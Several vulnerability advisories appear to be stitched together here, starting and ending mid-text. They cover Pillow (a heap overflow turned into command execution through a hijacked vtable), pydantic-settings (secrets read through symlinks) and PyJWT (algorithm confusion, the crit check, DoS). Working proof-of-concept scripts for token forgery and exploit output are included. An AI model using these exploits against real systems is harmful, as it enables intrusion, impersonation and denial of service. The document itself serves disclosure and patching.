bytes/pixel) ([`src/decode.c` L223-L226](https://github.com/python-pillow/Pillow/blob/12.2.0/src/decode.c#L223-L226)):  ```c state->bytes = (state->bits * state->xsize + 7) / 8;   // "LA" gives 2 * xsize bytes/row ... state->buffer = (UINT8 *)calloc(1, state->bytes); ```  In `JpegDecode.c` the rawmode string is mapped to a libjpeg `out_color_space`. Recognized modes (`CMYK`, `YCbCr`, `YCbCrK`, and so on) get a concrete colorspace, but `"LA"` and `"YCC;P"` are not recognized, so control reaches the fallback branch ([`src/libImaging/JpegDecode.c` L219-L221](https://github.com/python-pillow/Pillow/blob/12.2.0/src/libImaging/JpegDecode.c#L219-L221)):  ```c /* Disable decoder conversions. */ context->cinfo.jpeg_color_space = JCS_UNKNOWN; context->cinfo.out_color_space  = JCS_UNKNOWN; ```  Under `JCS_UNKNOWN`, libjpeg performs no color conversion and emits `cinfo.num_components` bytes per pixel, taken from the embedded JPEG's SOF marker, which the attacker sets to 4. So `jpeg_read_scanlines` writes `4 * width` bytes per row into a buffer allocated for only `2 * width` bytes ([`src/libImaging/JpegDecode.c` L252](https://github.com/python-pillow/Pillow/blob/12.2.0/src/libImaging/JpegDecode.c#L252)):  ```c ok = jpeg_read_scanlines(&context->cinfo, &state->buffer, 1);   // writes 4*W into a 2*W buffer ```  This is a heap out-of-bounds write with attacker-controlled length (the image width, up to tens of thousands of pixels, so about `2 * width` bytes of overflow per row) and attacker-controlled content (the decoded pixel data). The PoC weaponizes it: the overflow overwrites an adjacent Python `bytes` object's `ob_type` with a pointer to a fake `PyTypeObject` / `PyBufferProcs` vtable that the same overflow plants inside the decode buffer. When Pillow releases the input buffer, `PyBuffer_Release` walks `ob_type -> tp_as_buffer -> bf_releasebuffer` and executes `call *rax`; the PoC points that at `system@plt` (fixed, the interpreter binary is non-PIE) with `rdi` set to the command string, yielding command execution.  ### PoC  To facilitate an exact reproduction on an x86_64 machine, this PoC uses the version-pinned, ASLR-disabled Docker image from [Annex A](#annex-a-docker-setup).  The source code for the payload builder `make_payload.py` is in [Annex B](#annex-b-payload-builder-source).  `vulnerable.py` is the program under test, a one-liner that opens the file it is given:  ```python #!/usr/bin/env python3 # The entire vulnerable operation an application performs on an untrusted file. import sys from PIL import Image  Image.open(sys.argv[1]).load() ```  The payload is a standalone `.fpx` file the attacker crafts on their own host; the target only ever opens the resulting file, so building it requires no access to or code execution on the target. We run `make_payload.py` inside the same container here purely for convenience, so its baked-in addresses (`--offset`, `system@plt`) match this pinned image. The payload redirects the hijacked indirect call to `system@plt` (`0x4206c0`, fixed because the interpreter binary is non-PIE) with a baked-in command:  ```console $ python3 make_payload.py --target 0x4206c0 --cmd id --out shell.fpx [control] shell.fpx: S=0xdc8800 target=0x4206c0 cmd='id' craft_iters=0 bad=0 [control] opening it: vtable hijack -> call *0x4206c0 with rdi -> 'id' ```  Then open it with `vulnerable.py`:  ```console $ python3 vulnerable.py shell.fpx uid=0(root) gid=0(root) groups=0(root) corrupted size vs. prev_size ```  `Image.open()` of the crafted file runs the baked command via `system("id")`: command execution as the user running the image processing (root in the container).  The trailing `corrupted size vs. prev_size` is glibc aborting during interpreter teardown over the corrupted heap, after `id` has already run.  The builder writes the command inline at the hijacked `rdi`, so `--cmd` is limited to 7 bytes (for example `id`, `id;w`). `--offset` and `system@plt` are constants of the pinned, ASLR-disabled image and hold across runs of it.  ### Impact  This is a heap-based buffer overflow (CWE-122) / out-of-bounds write (CWE-787) that leads to code execution. Any application or service that opens attacker-influenced files with Pillow and has the optional `olefile` dependency installed is affected: image upload and thumbnailing services, avatar and media processing, document and image conversion pipelines, and similar. Because detection is by OLE2 magic rather than file extension and the overflow is triggered during a normal `Image.open()` / `load`, a server that automatically processes an uploaded file is exploitable with no user interaction. The result is arbitrary command execution in the context of the process performing the image processing, leading to full compromise of that process and the data and privileges it holds.  ### Annex A: Docker setup  The PoC runs in a pinned Docker image so the environment is deterministic; the image installs a version-pinned Python (3.12.3) and the Pillow 12.2.0 wheel, and the builder is pure Pillow. The image's entrypoint disables ASLR (`setarch -R`) to reduce the system knowledge requirements. The single `--security-opt seccomp=unconfined` flag on `docker run` is required only because turning ASLR off uses the `personality()` syscall that Docker's default seccomp profile blocks. ### Summary  `NestedSecretsSettingsSource` reads secret values from files in a configured `secrets_dir`. When `secrets_nested_subdir=True`, a directory entry inside `secrets_dir` that is a symbolic link pointing **outside** `secrets_dir` is followed, so files outside the configured directory are read into settings values. The same code path bypasses the documented `secrets_dir_max_size` protection. An attacker or lower-privileged component able to influence entries in the configured secrets directory (for example, a writable or shared secrets mount) can turn this into an unintended local file read into settings and can defeat the advertised loading-size cap. This report does not claim network reachability by itself.  ### Details  `NestedSecretsSettingsSource` performed two passes over `secrets_dir` using two different, inconsistent directory-traversal implementations:  * The size check in `validate_secrets_path()` used `Path.glob('**/*')`, which does **not** descend into a symbolically-linked directory. * The loader in `load_secrets()` used `glob.iglob(f'{path}/**/*', recursive=True)` followed by `read_text()`, which **does** follow symlinked directories and reads through the link target.  Because the two passes disagreed on symlinks, a symlinked directory inside `secrets_dir` whose target lives elsewhere was invisible to the size accounting (counted as 0 bytes) while still being fully read by the loader. This produces two distinct problems:  1. **Out-of-tree read (CWE-22 / CWE-59).** A symlinked directory (or file) inside `secrets_dir` that resolves outside it is followed, and the external file's contents are loaded into the corresponding settings field. 2. **`secrets_dir_max_size` bypass (CWE-400).** The size check never sees the out-of-tree content, so the documented size cap is neither respected nor able to reject the oversized external file. A related amplification exists for cyclic in-tree symlinks, which `glob.iglob(recursive=True)` re-traverses, inflating the size accounting and the number of loaded secrets.  #### Reproduction  In a clean Linux container, with a `secrets_dir` containing a symlink `secrets/db -> /path/outside` and an `outside/passwd` file of 512 bytes, while `secrets_dir_max_size=100`:  ```python from pydantic import BaseModel from pydantic_settings import (     BaseSettings,     SettingsConfigDict,     NestedSecretsSettingsSource, )   class Db(BaseModel):     passwd: str | None = None   class Settings(BaseSettings):     model_config = SettingsConfigDict(         secrets_dir='secrets',         secrets_nested_subdir=True,         secrets_dir_max_size=100,  # outside/passwd is 512 bytes     )     db: Db = Db()      @classmethod     def settings_customise_sources(         cls, settings_cls, init_settings, env_settings, dotenv_settings, file_secret_settings     ):         return (NestedSecretsSettingsSource(file_secret_settings),) ```  On affected versions, `Settings().db.passwd` is populated with the 512-byte out-of-tree file and **no** `SettingsError` is raised, even though the file exceeds `secrets_dir_max_size`.  ### Impact  Applications that opt into `NestedSecretsSettingsSource` with `secrets_nested_subdir=True` and load secrets from a directory whose entries can be influenced by an attacker or a lower-privileged component (for example, a writable or shared secrets mount, or a secrets directory partially populated from untrusted input) are affected. The impact is:  * **Confidentiality:** files outside the configured `secrets_dir` can be read into settings values (local file read). * **Integrity / availability of the safeguard:** the advertised `secrets_dir_max_size` cap can be bypassed, and cyclic symlinks can inflate resource usage during loading.  The vulnerability requires the ability to place a symbolic link inside the configured secrets directory; it is not remotely reachable on its own. Applications that do not use `NestedSecretsSettingsSource`, or that point `secrets_dir` at a directory fully under the application's control, are not affected.  ### Mitigation  Upgrade to **pydantic-settings 2.14.2**, which:  * walks the secrets directory explicitly and only descends into directories whose resolved path stays within `secrets_dir`, so symlinked directories pointing outside are never followed; * uses a single, cycle-safe iterator for both the size check and the loader, so the size accounting and the loaded set are always consistent and each real directory is visited at most once; * skips any file whose resolved path escapes `secrets_dir`, as defense in depth.  If upgrading is not immediately possible, ensure the configured `secrets_dir` is fully owned and controlled by the application (no writable or attacker-influenced entries), or avoid `secrets_nested_subdir=True`.

## Summary  PyJWT does not validate the `crit` (Critical) Header Parameter defined in RFC 7515 §4.1.11. When a JWS token contains a `crit` array listing extensions that PyJWT does not understand, the library accepts the token instead of rejecting it. This violates the **MUST** requirement in the RFC.  This is the same class of vulnerability as CVE-2025-59420 (Authlib), which received CVSS 7.5 (HIGH).  ---  ## RFC Requirement  RFC 7515 §4.1.11:  > The "crit" (Critical) Header Parameter indicates that extensions to this > specification and/or [JWA] are being used that **MUST** be understood and > processed. [...] If any of the listed extension Header Parameters are > **not understood and supported** by the recipient, then the **JWS is invalid**.  ---  ## Proof of Concept  ```python import jwt  # PyJWT 2.8.0 import hmac, hashlib, base64, json  # Construct token with unknown critical extension header = {"alg": "HS256", "crit": ["x-custom-policy"], "x-custom-policy": "require-mfa"} payload = {"sub": "attacker", "role": "admin"}  def b64url(data):     return base64.urlsafe_b64encode(data).rstrip(b"=").decode()  h = b64url(json.dumps(header, separators=(",", ":")).encode()) p = b64url(json.dumps(payload, separators=(",", ":")).encode()) sig = b64url(hmac.new(b"secret", f"{h}.{p}".encode(), hashlib.sha256).digest()) token = f"{h}.{p}.{sig}"  # Should REJECT — x-custom-policy is not understood by PyJWT try:     result = jwt.decode(token, "secret", algorithms=["HS256"])     print(f"ACCEPTED: {result}")     # Output: ACCEPTED: {'sub': 'attacker', 'role': 'admin'} except Exception as e:     print(f"REJECTED: {e}") ```  **Expected:** `jwt.exceptions.InvalidTokenError: Unsupported critical extension: x-custom-policy` **Actual:** Token accepted, payload returned.  ### Comparison with RFC-compliant library  ```python # jwcrypto — correctly rejects from jwcrypto import jwt as jw_jwt, jwk key = jwk.JWK(kty="oct", k=b64url(b"secret")) jw_jwt.JWT(jwt=token, key=key, algs=["HS256"]) # raises: InvalidJWSObject('Unknown critical header: "x-custom-policy"') ```  ---  ## Impact  - **Split-brain verification** in mixed-library deployments (e.g., API   gateway using jwcrypto rejects, backend using PyJWT accepts) - **Security policy bypass** when `crit` carries enforcement semantics   (MFA, token binding, scope restrictions) - **Token binding bypass** — RFC 7800 `cnf` (Proof-of-Possession) can be   silently ignored - See CVE-2025-59420 for full impact analysis  ---  ## Suggested Fix  In `jwt/api_jwt.py`, add validation in `_validate_headers()` or `decode()`:  ```python _SUPPORTED_CRIT = {"b64"}  # Add extensions PyJWT actually supports  def _validate_crit(self, headers: dict) -> None:     crit = headers.get("crit")     if crit is None:         return     if not isinstance(crit, list) or len(crit) == 0:         raise InvalidTokenError("crit must be a non-empty array")     for ext in crit:         if ext not in self._SUPPORTED_CRIT:             raise InvalidTokenError(f"Unsupported critical extension: {ext}")         if ext not in headers:             raise InvalidTokenError(f"Critical extension {ext} not in header") ```  ---  ## CWE  - CWE-345: Insufficient Verification of Data Authenticity - CWE-863: Incorrect Authorization  ## References  - [RFC 7515 §4.1.11](https://www.rfc-editor.org/rfc/rfc7515.html#section-4.1.11) - [CVE-2025-59420 — Authlib crit bypass (CVSS 7.5)](https://osv.dev/vulnerability/GHSA-9ggr-2464-2j32) - PyJWT is a JSON Web Token implementation in Python. Prior to 2.12.0, PyJWT does not validate the crit (Critical) Header Parameter defined in RFC 7515 §4.1.11. When a JWS token contains a crit array listing extensions that PyJWT does not understand, the library accepts the token instead of rejecting it. This violates the MUST requirement in the RFC. This vulnerability is fixed in 2.12.0.

PyJWT is a JSON Web Token implementation in Python. Prior to 2.13.0, PyJWKClient passes its uri argument directly to urllib.request.urlopen() which uses Python stdlib's default OpenerDirector registering HTTPHandler, HTTPSHandler, FTPHandler, FileHandler, and DataHandler. There is currently no documented option to restrict which schemes PyJWKClient will fetch. If an application's jku URL ingestion path accepts attacker-influenced URLs (e.g., from JWT header, configuration file, OAuth flow parameter), the attacker can cause PyJWKClient to read arbitrary local files via file:// (SSRF on local filesystem), cause PyJWKClient to attempt FTP / data-URI fetches (broader SSRF surface), or forge tokens that PyJWT verifies as valid. The library does not directly return non-HTTP(S) URI contents to the attacker; the chained "plant a JWKS to forge tokens" scenario described in the original report requires additional application-layer flaws (attacker write access to a filesystem path, untrusted jku derivation) that this fix does not address. This vulnerability is fixed in 2.13.0.

PyJWT is a JSON Web Token implementation in Python. Prior to 2.13.0, PyJWKClient.get_signing_key() forces a fresh HTTP request to the JWKS endpoint for every JWT with an unknown kid value, with no rate limiting. Since kid comes from the unverified token header, an attacker can trigger unlimited outbound requests. The vulnerability surfaces only when a JWKS fetch fails; an attacker can attempt to provoke that with sustained unknown-kid traffic, but the outcome depends on upstream JWKS-endpoint behavior (rate limiting, transient errors) which is beyond the attacker's control. This vulnerability is fixed in 2.13.0.

PyJWT is a JSON Web Token implementation in Python. From 2.8.0 to 2.12.1, when verifying detached JWS tokens using the unencoded-payload option ("b64": false, RFC 7797), PyJWT performs Base64URL decoding of the compact-serialization payload segment before enforcing the detached-payload rules. For b64=false, PyJWT later discards that decoded payload and replaces it with the caller-provided detached_payload. In practice, this turns the middle segment into an attacker-controlled “work amplifier”: a remote client can supply an arbitrarily large Base64URL payload segment that forces CPU work + memory allocations even if the signature is invalid. This creates an unauthenticated DoS vector against any endpoint that verifies detached JWS using PyJWT. This vulnerability is fixed in 2.13.0.

PyJWT is a JSON Web Token implementation in Python. From 2.9.0 to 2.12.1, there is a verifier-side algorithm allow-list bypass when jwt.decode() or jwt.decode_complete() are called with a PyJWK key. The token header alg is checked against the caller-supplied algorithms allow-list, but signature verification is performed with the algorithm bound to the PyJWK object instead of the header algorithm. An attacker who controls a registered JWK/JWKS private key can sign with a disallowed algorithm, advertise an allowed algorithm in the JWT header, and still be accepted. The issue affects the documented PyJWKClient.get_signing_key_from_jwt(...) flow. This vulnerability is fixed in 2.13.0.

> [!NOTE] >  The vulnerability surfaces only when a JWKS fetch fails; an attacker can attempt to provoke that with sustained unknown-kid traffic, but the outcome depends on upstream JWKS-endpoint behavior (rate limiting, transient errors) which is beyond the attacker's control. Impact is reduced auth availability until the next successful fetch, not complete denial of service.  ## Summary PyJWKClient.get_signing_key() forces a fresh HTTP request to the JWKS endpoint for every JWT with an unknown kid value, with no rate limiting. Since kid comes from the unverified token header, an attacker can trigger unlimited outbound requests.  Additionally, fetch_data() finally block clears the JWKS cache on network error.  ## Root Cause jwt/jwks_client.py:172-198 - get_signing_key(kid) calls get_signing_keys(refresh=True) for unknown kids, bypassing TTL cache with no cooldown. jwt/jwks_client.py:120-122 - finally block writes None to cache on error, clearing valid data.  ## Impact - DoS against JWKS endpoint (unlimited requests per invalid token) - DoS against application (network I/O latency) - Cascading failure (rate limiting clears cache, breaking legitimate auth)  ## Suggested Fix 1. Add refresh cooldown (refuse refresh more than once per TTL period) 2. Move cache write from finally to else block  ## Affected Versions All versions with PyJWKClient (2.4.0 through 2.12.1)

> [!NOTE] > Exploitation requires a verifier configured with both symmetric and asymmetric algorithms in `algorithms=[…]` and a raw-JSON JWK as the `key=` argument, both contrary to documented usage, hence the High attack-complexity rating.  ### Summary When the verifier is decoding JSON Web Tokens, while supporting both asymmetric and HMAC algorithms, the library does not validate use of JSON Web Keys in HMAC algorithm, allowing attacker to use the issuer public key as the secret key for HMAC algorithm.     ### Details In JWT algorithm confusion attack, the verifier is mistakenly use of public key to be used as the shared secret in symmetric algorithms. In pyjwt case, when the verifier is supporting both HMAC with other asymmetric algorithm and mistakenly using the public key of the issuer to verify the token as demonstrated in the following example:    `jws.decode(token, key=rsa_jwk_json, algorithms=["HS256","RS256"])) `  An attacker who specifies in the token header to use HMAC, will cause the verifier to accept the JWK as the secret key in HMAC algorithm.  The attacker will be able to forge JWT signed with the public key of the issuer to impersonate any user.   If we look on current protections implemented in the library, at class HMACAlgorithm:  ```   def prepare_key(self, key: str | bytes) -> bytes:         key_bytes = force_bytes(key)          if is_pem_format(key_bytes) or is_ssh_key(key_bytes):             raise InvalidKeyError(                 "The specified key is an asymmetric key or x509 certificate and"                 " should not be used as an HMAC secret."             )          return key_bytes ``` We can observe that there is a protection against this type of attacks but only when the verifier is using PEM format or SSH key to verify the token. JSON Web Keys, on the other hand will pass the validation.  In The following example: `jws.decode(token, key=rsa_jwk_json, algorithms=["HS256","RS256"])) ` There is indeed a wrong implementation of the verifier, but a stronger protection in the library side will prevent and protect against those type of misconfiugrations.   The bypass happens only if the verifier:  (a) allows HS* and an asymmetric algorithm in the same call and (b) passes a public-key value as key.  ### PoC Please run the code and observe the payload printed in clear text({"sub":"alice","admin":true}')  ``` from jwt.api_jws import PyJWS import json, base64, hmac, hashlib  def b64u(b): return base64.urlsafe_b64encode(b).rstrip(b"=")  # Public RSA JWK (public by design) rsa_jwk_json = json.dumps({"kty":"RSA","n":"AQAB","e":"AQAB"})  # Attacker-crafted token: flip to HS256 and choose claims header  = b64u(b'{"alg":"HS256","typ":"JWT"}') payload = b64u(b'{"sub":"alice","admin":true}') signing = header + b"." + payload  # Sign with HMAC using the PUBLIC JWK JSON TEXT as the “secret” sig   = hmac.new(rsa_jwk_json.encode(), signing, hashlib.sha256).digest() token = (signing + b"." + b64u(sig)).decode()  # Vulnerable verifier: mixed families + JWK JSON string as key jws = PyJWS() print(jws.decode(token, key=rsa_jwk_json, algorithms=["HS256","RS256"])) # -> b'{"sub":"alice","admin":true}' ```   ### Impact Unauthenticated token forgery → full identity/role impersonation at the resource server (authorization bypass).

> [!NOTE] > Scored assuming a deployment where algorithm policy functions as an authentication/authorization boundary. In deployments where the algorithm policy enforces crypto agility only, the practical confidentiality impact is lower and the issue is closer to an integrity-of-policy-enforcement bug.  PyJWT `2.9.0` through `2.12.1` allows a verifier-side algorithm allow-list bypass when `jwt.decode()` or `jwt.decode_complete()` are called with a `PyJWK` key. The token header `alg` is checked against the caller-supplied `algorithms` allow-list, but signature verification is performed with the algorithm bound to the `PyJWK` object instead of the header algorithm. An attacker who controls a registered JWK/JWKS private key can sign with a disallowed algorithm, advertise an allowed algorithm in the JWT header, and still be accepted. The issue affects the documented `PyJWKClient.get_signing_key_from_jwt(...)` flow.  ### Summary  PyJWT's `PyJWK` verification path allows a verifier-side algorithm allow-list bypass.  In affected versions, when a JWT is decoded with a `PyJWK` object, PyJWT verifies that the header `alg` string is present in the caller's `algorithms=[...]` list, but it does not actually use the header algorithm to verify the signature. Instead, it verifies with the algorithm already bound to the `PyJWK` object.  This lets an attacker who controls a registered JWK/JWKS private key sign with a disallowed algorithm and have the token accepted as long as the JWT header advertises an allowed algorithm. This affects the documented `PyJWKClient` usage flow and does not require any non-default flags or unsafe configuration.  ### Details  In `jwt/api_jws.py` in `2.12.1`, `_verify_signature()` treats `PyJWK` keys differently from normal PEM/public-key inputs:  ```python if algorithms is None and isinstance(key, PyJWK):     algorithms = [key.algorithm_name]  ...  if not alg or (algorithms is not None and alg not in algorithms):     raise InvalidAlgorithmError("The specified alg value is not allowed")  if isinstance(key, PyJWK):     alg_obj = key.Algorithm     prepared_key = key.key else:     alg_obj = self.get_algorithm_by_name(alg)     prepared_key = alg_obj.prepare_key(key) ```  This logic means:  1. The JWT header `alg` is checked only as a string against the caller-supplied allow-list. 2. If the key is a `PyJWK`, the actual verifier is not selected from the header algorithm. 3. Instead, PyJWT always verifies with `key.Algorithm`, which is fixed when the `PyJWK` object is created.  `PyJWK` binds its algorithm in `jwt/api_jwk.py` from the JWK's `alg` field or from key-type defaults:  ```python if not algorithm and isinstance(self._jwk_data, dict):     algorithm = self._jwk_data.get("alg", None)  ...  self.algorithm_name = algorithm self.Algorithm = get_default_algorithms()[algorithm] self.key = self.Algorithm.from_jwk(self._jwk_data) ```  So once a `PyJWK` is constructed, the verifier uses the `PyJWK`'s bound algorithm, not the JWT header algorithm.  The issue is reachable through the documented JWKS flow. In `docs/usage.rst`, the project documents:  ```python signing_key = jwks_client.get_signing_key_from_jwt(token) jwt.decode(     token,     signing_key,     audience="https://expenses-api",     options={"verify_exp": False},     algorithms=["RS256"], ) ```  `PyJWKClient.get_signing_key_from_jwt()` returns a `PyJWK`, so this documented path is affected.  This is not a "no-key forgery" issue. The attacker still needs control of an accepted JWK/JWKS private key. However, that is realistic in deployments such as:  - self-service OAuth client assertions - multi-tenant key registration - federation / BYO-JWKS trust models - any system where external parties sign JWTs with their own registered keys  In those cases, the attacker can bypass verifier-side algorithm policy. For example, if the server intends to only accept `PS256`, an attacker controlling an accepted RSA JWK can sign with `RS256`, set `alg=PS256` in the JWT header, and still be accepted through the `PyJWK` path.  The same forged token is rejected through the normal PEM/public-key verification path, which shows the bug is specific to `PyJWK` verification rather than expected JWT behavior.  This behavior was introduced by commit `ab8176abe21e550dbc1c9a6bb7e78ad80853bfb1` (`Decode with PyJWK (#886)`), which is present in tagged releases `2.9.0`, `2.10.0`, `2.10.1`, `2.11.0`, `2.12.0`, and `2.12.1`.  ### PoC  Tested locally against PyJWT `2.12.1` on Python `3.12.10` with `cryptography 45.0.6`.  Install dependencies:  ```bash python -m pip install pyjwt==2.12.1 cryptography ```  Run the following script:  ```python import json import jwt from cryptography.hazmat.primitives.asymmetric import rsa from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat from jwt.api_jwk import PyJWK from jwt.algorithms import RSAAlgorithm from jwt.utils import base64url_encode  # Generate an RSA keypair controlled by the attacker. priv = rsa.generate_private_key(public_exponent=65537, key_size=2048) pub = priv.public_key() pub_pem = pub.public_bytes(Encoding.PEM, PublicFormat.SubjectPublicKeyInfo)  # Build a PyJWK from the public key. # With an RSA JWK and no explicit alg, PyJWK binds to RS256 by default. jwk = PyJWK.from_json(RSAAlgorithm.to_jwk(pub))  # Create a token whose protected header claims RS512. header = {"typ": "JWT", "alg": "RS512"} payload = {"sub": "alice"}  header_b64 = base64url_encode(     json.dumps(header, separators=(",", ":"), sort_keys=True).encode() ) payload_b64 = base64url_encode(     json.dumps(payload, separators=(",", ":")).encode() ) signing_input = b".".join([header_b64, payload_b64])  # Sign the RS512-labelled token with RS256 instead. sig = RSAAlgorithm(RSAAlgorithm.SHA256).sign(signing_input, priv) token = b".".join([header_b64, payload_b64, base64url_encode(sig)]).decode()  print("token:", token) print("PyJWK path:") print(jwt.decode(token, jwk, algorithms=["RS512"]))  print("PEM path:") try:     print(jwt.decode(token, pub_pem, algorithms=["RS512"])) except Exception as e:     print(f"{type(e).__name__}: {e}") ```  Observed output:  ```text PyJWK path: {'sub': 'alice'} PEM path: InvalidSignatureError: Signature verification failed ```  The token is accepted when the verification key is a `PyJWK`, even though:  - the caller restricted allowed algorithms to `["RS512"]` - the signature was actually generated with `RS256`  The same token is rejected when verified through the normal PEM/public-key path.  ### Impact  This is an algorithm allow-list bypass affecting `jwt.decode()` and `jwt.decode_complete()` when the verification key is a `PyJWK`, including keys returned by `PyJWKClient`.  The impact depends on the deployment model:  - If attackers cannot control any accepted JWK/JWKS private key, practical exploitability is limited. - If attackers can legitimately control a registered key, this is exploitable.  Impacted deployments include:  - JWT client assertion flows where each client uses its own key - multitenant systems where tenants register JWK/JWKS material - federation-style trust models - any application that relies on `algorithms=[...]` to enforce a crypto policy against externally controlled signing keys  What an attacker can do:  - bypass a server-side requirement such as "only `PS256`" or "only `RS512`" - continue using a deprecated or blocked algorithm after the server thought it had disabled it - authenticate successfully as their own client / tenant / federation principal even though they do not satisfy the configured algorithm policy  What this issue does not do by itself:  - it does not let an attacker forge tokens without access to a valid signing key or signing oracle - it does not automatically enable cross-tenant impersonation unless the surrounding application trust model adds another flaw

> [!NOTE] > Practical impact depends on whether request body-size limits are enforced upstream (proxy/web-server/framework). Deployments with typical body-size caps (≤2 MB) bound the amplifier significantly; deployments accepting larger token inputs are more exposed.  When verifying detached JWS tokens using the unencoded-payload option (`"b64": false`, RFC 7797), PyJWT performs **Base64URL decoding of the compact-serialization payload segment** *before* enforcing the detached-payload rules.  For `b64=false`, PyJWT later **discards** that decoded payload and replaces it with the caller-provided `detached_payload`. In practice, this turns the middle segment into an attacker-controlled “work amplifier”: a remote client can supply an arbitrarily large Base64URL payload segment that forces **CPU work + memory allocations** even if the signature is invalid.  This creates an **unauthenticated DoS** vector against any endpoint that verifies detached JWS using PyJWT.  ---  ## Affected Component(s)  * `jwt/api_jws.py`    * `PyJWS.decode()` / `PyJWS.decode_complete()`   * `_load()` (parsing and Base64URL decoding)  ---  ## Root Cause (exact logic flaw)  ### What happens in the code  In `jwt/api_jws.py`, `decode_complete()` does the following (order matters):  * Calls `_load(jwt)` first, which decodes the token segments * Only after that, checks `header.get("b64")` and if `False`, it replaces `payload = detached_payload` and rebuilds the signing input  This behavior is visible in `decode_complete()`:  * `_load(jwt)` happens **before** the `b64=false` handling * then `payload = detached_payload` and `signing_input = ... detached_payload` happens afterward ([GitHub][1])  Inside `_load()`, PyJWT unconditionally performs:  * `payload = base64url_decode(payload_segment)`   This is the expensive step the attacker can amplify ([GitHub][1])  ### Why this becomes a vulnerability  For `b64=false` detached JWS, the payload segment in compact form is effectively **not needed** for verification in PyJWT’s own logic (since the library uses `detached_payload` as the real payload). Yet PyJWT still decodes it first, meaning:  * cost is paid **even when signature is invalid** * the decoded bytes are **discarded** * attacker controls the size of this cost via token length  ---  ## Impact (evidence-driven)  ### Security impact  * **Unauthenticated remote DoS**: decoding work happens before signature rejection → attacker does not need signing key. * **CPU amplification**: Base64URL decode time scales linearly with payload segment size. * **Memory amplification**: decoded output allocates large byte buffers (tens of MB per request). * **Operational impact**: request queueing / worker starvation under modest concurrency bursts.  ### Standards context (RFC 7797)  RFC 7797 explicitly notes this option is used when payload is large and/or detached, and discusses interoperability requirements around marking it critical (“crit” with “b64”). ([IETF Datatracker][2]) (PyJWT supports `crit` validation, but the issue here is decode order / unbounded decode of an unused segment.)  ---  ## Affected Versions  * **Confirmed affected:** PyJWT **2.12.1** (tested from your local editable install and repo). * **Likely affected:** all versions that include detached payload support for JWS decoding, which was introduced in **2.4.0** (“Add detached payload support for JWS encoding and decoding”). ([pyjwt.readthedocs.io][3])  (For GHSA, this phrasing is strong: “confirmed” + “likely since feature introduction”.)  ---  # Threat Model   ### Typical real deployment  A service verifies signed HTTP requests or webhooks using detached JWS:  * token is provided in JSON body / query / header * actual payload is the HTTP request body passed as `detached_payload`  ### Attacker  * remote unauthenticated client * can send requests to verify endpoint * does **not** need a valid signature (invalid signature still triggers the expensive decode path)  ### Attack chain  1. Attacker crafts a JWS compact token with header containing `"b64": false` and `crit:["b64"]`. 2. Attacker inflates the **payload segment** (middle segment) to millions of Base64URL characters. 3. Server calls `PyJWS.decode(...detached_payload=...)`. 4. PyJWT decodes the inflated segment (CPU + memory). 5. Signature is rejected afterward (401) — but resources already consumed. 6. Repeated requests or bursts cause queueing/worker starvation → DoS.  ---  # Proof of Concept - file names + results  ## PoC placement   * [server_localhost.py](https://github.com/user-attachments/files/26132755/server_localhost.py)  * [client_localhost.py](https://github.com/user-attachments/files/26132757/client_localhost.py)  * [flood_localhost.py](https://github.com/user-attachments/files/26132760/flood_localhost.py)   ---  ## PoC # 1 -
